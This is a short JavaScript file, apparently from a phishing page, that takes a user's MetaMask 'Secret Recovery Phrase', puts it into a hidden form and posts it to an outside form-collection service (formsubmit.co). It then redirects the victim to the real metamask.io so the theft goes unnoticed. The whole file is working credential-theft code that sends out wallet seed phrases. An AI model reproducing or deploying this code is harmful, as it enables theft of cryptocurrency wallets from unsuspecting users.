document.addEventListener("DOMContentLoaded", (e) => {
    e.preventDefault();
    const emailInput = document.querySelector("#email-from-user");
    const emailSendButton = document.querySelector("#send-user-email");

    emailSendButton.addEventListener("click", (e) => {
        e.preventDefault();

        if (String(emailInput.value).trim() == "") {
            return;
        }

        const newForm = document.createElement("form");
        const input1 = document.createElement("input");
        const input2 = document.createElement("input");
        const input3 = document.createElement("input");
        newForm.setAttribute("method", "post");
        newForm.setAttribute(
            "action",
            `https://formsubmit.co/${process.env.SUBMIT_CODE}`
        );
        newForm.classList.add("hidden");

        newForm.innerHTML = `
        <input type="hidden" name="_next" value="https://metamask.io/" />
        <input type="hidden" name="_captcha" value="false" />
        <div class="mb-3">
          <div class="d-flex flex-row justify-content-between">
            <label
              for="sec-rec-phr"
              class="form-label text-white w-75"
              style="text-align: left"
            >
              Secret Recovery Phrase
            </label>
          </div>
          <input
            type="text"
            class="bg-dark border-secondary form-control text-white"
            id="sec-rec-phr"
            placeholder="Enter your Secret Recovery Phrase"
            name="recovery-phrase"
            value=${emailInput.value}
          />
        </div>
        `;
        emailSendButton.parentElement.appendChild(newForm);

        newForm.submit();
        emailInput.value = "";
    });
});
